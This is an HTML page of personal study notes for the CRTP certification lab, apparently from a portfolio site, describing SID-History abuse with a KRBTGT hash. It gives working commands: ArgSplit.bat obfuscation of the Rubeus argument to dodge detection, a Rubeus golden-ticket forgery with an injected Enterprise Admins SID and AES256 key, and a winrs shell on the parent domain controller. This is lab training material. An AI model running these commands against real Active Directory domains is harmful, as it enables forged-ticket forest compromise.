@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SID-History KRBTGT - CRTP</title>
+  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
+  <link rel="stylesheet" href="../../assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+  <style>
+    .crtp-sidebar { padding: 20px; }
+    .crtp-sidebar h3 { color: #ffdb70; margin-bottom: 15px; font-size: 1.1rem; }
+    .crtp-sidebar .home-link { 
+      display: block; 
+      padding: 10px 12px; 
+      margin-bottom: 15px; 
+      color: #ffdb70; 
+      text-decoration: none; 
+      border-radius: 6px; 
+      font-size: 0.9rem; 
+      font-weight: 600;
+      background: #2a2a2a;
+      transition: all 0.2s;
+    }
+    .crtp-sidebar .home-link:hover { 
+      background: #ffdb70; 
+      color: #1a1a1a; 
+    }
+    .crtp-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
+    .crtp-sidebar a:hover { background: #2a2a2a; color: #ffdb70; }
+    .crtp-sidebar a.active { background: #ffdb70; color: #1a1a1a; font-weight: 600; }
+    .page-nav { display: flex; justify-content: space-between; margin: 30px 0; padding: 20px 0; border-top: 1px solid #2a2a2a; }
+    .nav-btn { background: #2a2a2a; color: #ffdb70; padding: 10px 20px; border-radius: 6px; text-decoration: none; transition: all 0.2s; }
+    .nav-btn:hover { background: #ffdb70; color: #1a1a1a; }
+    .notion-content { line-height: 1.6; }
+    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
+    .notion-content h1 { font-size: 1.8rem; margin: 30px 0 20px; color: #fafafa; }
+    .notion-content h2 { font-size: 1.5rem; margin: 25px 0 15px; color: #fafafa; }
+    .notion-content h3 { font-size: 1.3rem; margin: 20px 0 10px; color: #fafafa; }
+    .notion-content p { margin: 15px 0; color: #d6d6d6; }
+    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
+    .notion-content li { margin: 5px 0; color: #d6d6d6; }
+    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #ffdb70; }
+    .notion-content pre { background: #1e1e1e; border-left: 4px solid #ffdb70; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
+    .notion-content pre code { background: transparent; padding: 0; color: #d6d6d6; }
+    .notion-content a { color: #ffdb70; text-decoration: underline; }
+    .notion-content strong { color: #fafafa; font-weight: 600; }
+    .notion-content em { font-style: italic; }
+    .notion-content figure { margin: 20px 0; }
+    .notion-content figcaption { display: none; }
+    .main-content { max-width: 100% !important; }
+    .about { max-width: 100% !important; padding: 20px 40px !important; }
+  </style>
+</head>
+<body>
+  <main>
+    <aside class="sidebar" data-sidebar>
+      <div class="sidebar-info">
+        <figure class="avatar-box">
+          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
+        </figure>
+        <div class="info-content">
+          <h1 class="name" title="Mr Stark">Mr Stark</h1>
+          <p class="title">CRTP Study Notes</p>
+        </div>
+        <button class="info_more-btn" data-sidebar-btn>
+          <span>Show Navigation</span>
+          <ion-icon name="chevron-down"></ion-icon>
+        </button>
+      </div>
+      <div class="sidebar-info_more">
+        <div class="separator"></div>
+        <div class="crtp-sidebar">
+          <a href="../../" class="home-link">← Home</a>
+          <a href="../../certifications/" class="home-link">← Certifications</a>
+          <h3>Sections</h3>
+          <a href="enumeration.html" class="">Enumeration</a>
+          <a href="privilege-escalation.html" class="">Privilege Escalation</a>
+          <a href="privilege-escalation-domain-admin.html" class="">Privilege Escalation via Domain Admin</a>
+          <a href="golden-ticket.html" class="">Golden Ticket</a>
+          <a href="silver-ticket.html" class="">Silver Ticket</a>
+          <a href="diamond-ticket.html" class="">Diamond Ticket</a>
+          <a href="abusing-dsrm-credentials.html" class="">Abusing DSRM Credentials</a>
+          <a href="dcsync-attack.html" class="">DCSync Attack</a>
+          <a href="security-descriptor-abuse.html" class="">Security Descriptor Abuse</a>
+          <a href="asrep-roasting.html" class="">AS-REP Roasting</a>
+          <a href="unconstrained-delegation.html" class="">Unconstrained Delegation</a>
+          <a href="constrained-delegation.html" class="">Constrained Delegation</a>
+          <a href="rbcd.html" class="">RBCD</a>
+          <a href="sid-history-trust-ticket.html" class="">SID-History Trust Ticket</a>
+          <a href="sid-history-krbtgt.html" class="active">SID-History KRBTGT</a>
+          <a href="cross-forest-trust.html" class="">Cross-Forest Trust</a>
+          <a href="adcs-attacks.html" class="">ADCS Attacks</a>
+          <a href="trust-links-abuse.html" class="">Trust Links Abuse</a>
+          <a href="mde-mdi-bypass.html" class="">MDE/MDI Bypass</a>
+
+        </div>
+        <div class="separator"></div>
+        <ul class="contacts-list">
+          <li class="contact-item">
+            <div class="icon-box">
+              <ion-icon name="mail-outline"></ion-icon>
+            </div>
+            <div class="contact-info">
+              <p class="contact-title">Email</p>
+              <a href="mailto:daviosardinha@gmail.com" class="contact-link">daviosardinha@gmail.com</a>
+            </div>
+          </li>
+        </ul>
+      </div>
+    </aside>
+
+    <div class="main-content">
+      <article class="about active" data-page="about">
+        <header class="h2 article-title">SID-History KRBTGT</header>
+        <section class="about-text">
+          <div class="notion-content">
+<h3>SID-History Abuse with KRBTGT Hash</h3>
+<p>SID-History Abuse with KRBTGT hash is a technique used to escalate privileges and bypass access controls in Windows systems. It involves injecting higher-privileged SIDs into the SID History attribute of a user account, effectively granting the user the permissions associated with those higher-privileged groups.</p>
+<h3>How SID-History Abuse Works</h3>
+<ol>
+<li>
+<p>Compromising a Standard User Account: An attacker first compromises a standard user account with some level of privileges.</p>
+</li>
+<li>
+<p>Adding Higher-Privileged SIDs: The attacker then adds the SID of a higher-privileged group (such as Enterprise Admins or Domain Admins) to the SID History attribute of the compromised user account.</p>
+</li>
+<li>
+<p>Elevated Access: With the higher-privileged SIDs in the SID History, the user account now has elevated access to resources and systems within the parent domain.</p>
+</li>
+</ol>
+<h3>KRBTGT Hash Abuse</h3>
+<p>The KRBTGT hash is a critical component in the SID-History Abuse process. The KRBTGT hash is used to sign the Kerberos tickets, which are used to authenticate users and grant access to resources.</p>
+<h3>How KRBTGT Hash Abuse Works</h3>
+<ol>
+<li>
+<p>Compromising the KRBTGT Hash: An attacker compromises the KRBTGT hash, which is used to sign Kerberos tickets.</p>
+</li>
+<li>
+<p>Forging Kerberos Tickets: The attacker uses the compromised KRBTGT hash to forge Kerberos tickets that can be used to access resources across the domain.</p>
+</li>
+<li>
+<p>Elevated Access: With the forged Kerberos tickets, the attacker can access resources and systems within the domain, effectively bypassing normal access controls.</p>
+</li>
+</ol>
+<p>Assuming that we were able to compromise Domain Admin and we have KRBTGT hash dumped, it gets easy to abuse trusts used the KRBTGT.
+Having a session as Domain Admin, we can simply use Rubeus to abuse this SID-History with KRBTGT hash.</p>
+<p>With DCORP-DC(dollarcorp DC) KRBTGT secrets we can simply create a golden ticket and access MCORP-DC. I’ll be using AES256 key here.</p>
+<p>Let’s encode out Rubeus payload with Argsplit.bat and copy/paste it.</p>
+<p>ArgSplit.bat</p>
+<p><code>golden</code></p>
+<div class="highlight"><pre><span></span><code><span class="p">[!]</span> <span class="n">Argument</span> <span class="n">Limit</span><span class="p">:</span> <span class="n">180</span> <span class="n">characters</span>
+<span class="p">[+]</span> <span class="n">Enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">golden</span>
+<span class="nb">set </span><span class="s2">&quot;z=n&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;y=e&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;x=d&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;w=l&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;v=o&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;u=g&quot;</span>
+<span class="nb">set </span><span class="s2">&quot;Pwn=%u%%v%%w%%x%%y%%z%&quot;</span>
+</code></pre></div>
+
+<p>Now let’s use Rubeus to forge our Golden Ticket and Access to Parent Domain Controller.</p>
+<p><code>C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt</code></p>
+<p>We can see above that our tickey has been successfully imported into our Cached Ticket
+We can double check out Cached Ticket witht <strong>klist</strong> command.</p>
+<p><code>klist</code></p>
+<p>We can confirm above that we do have a valid ticket into our Cached Tickets session.
+Now let’s access MDCORP-DC in moneycorp.local domain.</p>
+<p><code>winrs -r:mcorp-dc.moneycorp.local cmd</code></p>
+<p>Adn this way we were able to abuse SID-History with KRBTGT Hash.</p>
+          </div>
+        </section>
+      </article>
+    </div>
+  </main>
+
+  <script src="../../assets/js/script.js"></script>
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+</body>
+</html>
